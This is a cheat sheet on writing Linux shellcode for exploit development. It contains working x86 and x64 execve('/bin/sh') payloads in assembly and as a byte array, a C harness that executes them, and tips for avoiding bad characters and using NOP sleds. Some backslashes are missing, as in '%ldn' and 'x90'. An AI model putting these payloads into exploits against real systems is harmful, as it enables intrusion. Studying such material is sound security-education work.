# Assembly for Hackers: Writing Custom Shellcode

This cheat sheet introduces writing custom shellcode in **x86 and x64 Linux assembly**, focusing on exploit development, payloads, and raw binary output for buffer overflows, SROP, or manual injection.

---

## 🧠 What is Shellcode?

Shellcode is raw binary machine code — not necessarily a shell — used during exploitation. Typical goals:

- Spawn a shell
- Execve arbitrary commands
- Download/execute malware
- Manipulate memory (mmap/mprotect)

---

## ⚙️ Development Environment

### Tools Required

```bash
sudo apt install nasm gcc objdump libseccomp-dev
```

For testing:
- `nasm`: assemble `.asm` to `.bin`
- `ndisasm`: disassemble raw binaries
- `objdump`: inspect ELF files
- `strace`: trace syscalls

---

## 🏗 Shellcode Workflow

1. Write in **nasm-style** Intel x86/64 assembly
2. Assemble to raw binary (`.bin`)
3. Convert to hex or byte array
4. Inject or test via C, Python, or in-memory loader

---

## ✍️ Example 1: execve("/bin/sh", NULL, NULL) — x86 Linux

### `shellcode.asm`:

```asm
BITS 32
global _start

section .text
_start:
    xor eax, eax
    push eax              ; NULL terminator
    push 0x68732f2f       ; "//sh"
    push 0x6e69622f       ; "/bin"
    mov ebx, esp          ; ebx = pointer to "/bin//sh"
    push eax              ; NULL envp
    push ebx              ; argv = ["/bin/sh", NULL]
    mov ecx, esp
    xor edx, edx
    mov al, 0xb           ; syscall number for execve
    int 0x80
```

---

## 🛠 Assemble + Dump Bytes

```bash
nasm -f bin shellcode.asm -o shellcode.bin
xxd -i shellcode.bin     # Format for C arrays
```

---

## 🧪 Run in C Wrapper

```c
#include <stdio.h>
#include <string.h>

unsigned char code[] = {
  0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,
  0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,
  0x53,0x89,0xe1,0x31,0xd2,0xb0,0x0b,0xcd,0x80
};

int main() {
  printf("Shellcode Length:  %ldn", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
```

---

## ✍️ Example 2: x86_64 execve("/bin/sh")

```asm
BITS 64
global _start

section .text
_start:
    xor rax, rax
    mov rbx, 0x68732f6e69622f2f
    shr rbx, 8
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59         ; syscall execve
    syscall
```

---

## 🔢 Syscall Table (Linux)

| Syscall      | x86 # | x86_64 # |
|--------------|--------|----------|
| `execve`     | 11     | 59       |
| `read`       | 3      | 0        |
| `write`      | 4      | 1        |
| `open`       | 5      | 2        |
| `mmap`       | 90     | 9        |
| `exit`       | 1      | 60       |

---

## 🔐 Shellcode Constraints

When writing shellcode for exploits:
- Avoid **NULL bytes** (0x00)
- Avoid bad chars (e.g., 0x0a, 0x0d for strings)
- Use **short instructions** (for ROP/SROP)
- **Position-independent code** (don't rely on absolute addresses)

---

## 🛡 Techniques for Safe Shellcode

- Use `xor reg, reg` instead of `mov reg, 0`
- Use `push` + `call` trick to store strings
- Use `jmp-call-pop` to get EIP/RIP for shellcode-relative pointers

---

## 📦 Tools for Shellcode Dev

- `msfvenom` (good for generating raw shellcode with known payloads)
- `pwntools` (for scripting exploits with custom shellcode)
- `Radare2` or `Ghidra` (inspect shellcode statically)
- `shellnoob` (assemble/disassemble quickly)

---

## 📍 Testing in GDB

```bash
gdb -q ./shellcode_test
set disassembly-flavor intel
run
# Or inject into memory and jump
```

---

## 🧯 Tips

- Use `/bin//sh` (double slash) to pad 8 bytes
- Always test with `strace ./a.out` to verify syscalls
- NOP sleds (`x90`) still useful in buffer exploits
- Align stack on x86_64 (e.g., 16-byte alignment)

---


